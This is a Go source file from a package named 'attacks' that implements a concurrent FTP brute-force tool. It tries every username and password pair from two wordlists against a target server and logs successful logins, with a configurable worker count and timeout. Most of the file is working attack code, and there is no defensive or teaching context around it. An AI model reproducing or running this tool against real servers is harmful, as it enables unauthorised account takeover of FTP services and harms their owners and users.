package attacks

import (
	"fmt"
	"log"
	"time"

	"github.com/jlaffaye/ftp"
)

type loginChan struct {
	user string
	pass string
	pos  int
}

//workFTP goroutine for one attack of FTP
func workFTP(job login, serverIP, serverPort string, nTimeOut int) {
	fmt.Println(yellow("[attemp] ", job.pos, " ", job.user, ":", job.pass))
	defer wg.Done()

	t := serverIP + ":" + serverPort
	// log.Println(t)
	c, err := ftp.Dial(t, ftp.DialWithTimeout(time.Duration(nTimeOut)*time.Second))
	if err != nil {
		// log.Fatal(err)
		// log.Println("[X] Failed to connect to ",t ,job.user, job.pass,job.pos)
		// log.Println("failed to connect to host", t, job.user, job.pass, job.pos)
		log.Println(magenta(err), t, job.user, job.pass, job.pos)
		return
	}

	err = c.Login(job.user, job.pass)
	if err != nil {
		log.Println(red("[X] Failed to connect ", job.pos, " at ", t, " ", job.user, ":", job.pass))
	} else {
		log.Println(green("[+][+] Session Connect ", job.pos, " at ", t, " ", job.user, ":", job.pass))
	}

	if err := c.Quit(); err != nil {
		log.Fatal(err)
	}
}

//FTPattackStart FTP attack with 2 files to iterate
func FTPattackStart(userFile, passFile, serverIP, serverPort string, nWorkers, nTimeOut int) {
	if nWorkers == 0 {
		nWorkers = 9
	}
	if nTimeOut == 0 {
		nTimeOut = 5
	}

	log.Println("[0] Starting jobs")
	log.Println(userFile, passFile, serverIP, serverPort, nWorkers)

	// firstchan := make(chan loginChan, n_workers)
	// outchan := make(chan loginChan,n_workers)
	// okchan := make(chan bool)
	// go reader_list(userFile, firstchan, okchan)
	// go reader_list2(passFile, firstchan, outchan, okchan)
	outchan := make(chan login, nWorkers)
	go Read2Files(userFile, passFile, outchan)
	var sem = make(chan int, nWorkers)
	for i := 0; i < nWorkers; i++ {
		sem <- 1
	}
	for {
		select {
		case job, ok := <-outchan:
			if !ok {
				wg.Wait()
				log.Println(yellow("[info] jobs finisished"))
				return
			}
			wg.Add(1)
			<-sem
			// sem <- 1
			go func(job login) {
				workFTP(job, serverIP, serverPort, nTimeOut)
				// <- sem
				sem <- 1
			}(job)
		}
	}
}

// func reader_list(file_name string, listchan chan<- loginChan, okchan chan bool){
//     f1, err := os.Open(file_name)
//     check(err)

//     defer func(){
//         f1.Close()
//         close(listchan)
//     }()

//     reader := bufio.NewScanner(f1)

//     var list [] string
//     for i:= 0; reader.Scan(); i++{
//         // fmt.Println(reader.Text())
//         list = append(list, reader.Text())
//         // listchan<- list[len(list)-1]
//         listchan <- loginChan{user: list[len(list)-1]}
//     }
//     if err:= reader.Err(); err!=nil{
//         check(err)
//     }

//     i:=0
//     for {
//         select {
//             case <-okchan:
//                 close(okchan)
//                 return
//             case listchan <- loginChan{user: list[i]}:
//                 // log.Println("enviando a listchan")
//                 i = (i+1)%len(list)
//         }
//     }

// }

// func reader_list2(file_name string, listchan, outchan chan loginChan, okchan chan bool){
//     f1, err := os.Open(file_name)
//     check(err)

//     defer func(){
//         f1.Close()
//         close(outchan)
//     }()

//     reader := bufio.NewScanner(f1)

//     var list [] string
//     for i:= 0; reader.Scan(); i++{
//         // fmt.Println(reader.Text())
//         list = append(list, reader.Text())
//         // outchan<- fmt.Sprint(i," ", list[len(list)-1], " - ", <-listchan)
//         login :=<- listchan
//         login.pass = list[len(list)-1]
//         login.pos = i
//         outchan <- login
//     }
//     if err:= reader.Err(); err!=nil{
//         check(err)
//     }

//     okchan <- true

// }
